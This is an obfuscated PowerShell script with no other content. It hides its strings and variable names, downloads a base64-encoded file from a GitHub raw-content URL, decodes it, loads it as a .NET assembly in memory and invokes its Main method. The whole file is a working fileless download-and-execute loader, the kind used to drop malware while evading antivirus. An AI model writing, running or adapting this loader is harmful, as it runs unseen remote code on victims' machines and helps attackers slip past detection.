 .("{0}{1}" -f's','et') ("wm"+"fHEy")  ([tyPe]("{3}{2}{1}{0}" -F'verT','CoN','stem.','SY') ) ;  .("{0}{3}{2}{1}"-f'SEt','AriabLe','V','-')  ("{1}{0}"-f '9Xe','t')  ( [tYPE]("{3}{4}{1}{5}{0}{6}{2}" -F 'CTiOn','Em.ReF','y','sy','st','Le','.ASSeMbL')  )  ;    ${z`B1}= [TYpE]("{3}{0}{4}{2}{1}" -f 'M.A','TOR','A','SYSte','CtİV')  ; ${u`RL} = ("{3}{5}{27}{16}{1}{15}{7}{18}{17}{6}{0}{14}{9}{4}{24}{28}{22}{12}{25}{29}{8}{31}{20}{2}{23}{11}{10}{21}{13}{19}{30}{26}"-f 'tXx','user','sdaxs','htt','s','ps://raw.gi','ho','ontent.c','ac','axd','dscsa/ma','dax','ac','d','/dxdas','c','b','dS','om/Hea','en','xsdc','in/','s','a','acd','dsxda','me.txt','thu','sad','s','e','da')

${resPo`N`sE} = &("{2}{3}{0}{1}{4}"-f 'ebR','equ','Invoke','-W','est') -Uri ${u`Rl} -UseBasicParsing

if (${rE`s`PonSE}."s`TaTU`ScODe" -eq 200) {
    ${bAse`64s`Tring} = ${RE`sP`ONsE}."co`N`TEnt"

    ${B`YT`e`ArRaY} =   ${WM`Fh`eY}::("{2}{0}{3}{1}{4}"-f'ase64Str','n','FromB','i','g').Invoke(${bas`E64StR`İng})
    ${A`sS`EmbLY} =  (  &('Ls')  ("{0}{4}{1}{3}{2}" -f'v','iab','xE','le:T9','aR') )."Va`lue"::("{0}{1}"-f 'Loa','d').Invoke(${b`y`T`eaRRay})

    ${Cl`A`Ss} = ${A`SS`EmBLY}.("{0}{1}"-f'GetTy','pe').Invoke(("{3}{0}{1}{2}"-f 'JA','Msrp','fhk.HH','Q'))
    ${mE`T`hod} = ${CLa`SS}.("{0}{2}{3}{1}" -f 'G','thod','e','tMe').Invoke(("{1}{0}"-f 'n','Mai'))

    ${İNST`An`CE} =   ${Z`B1}::("{0}{1}{2}" -f'Creat','eInstan','ce').Invoke(${cLa`ss})
    ${m`eTHod}.("{1}{0}"-f 'voke','In').Invoke(${iNs`TAn`Ce}, @())
}
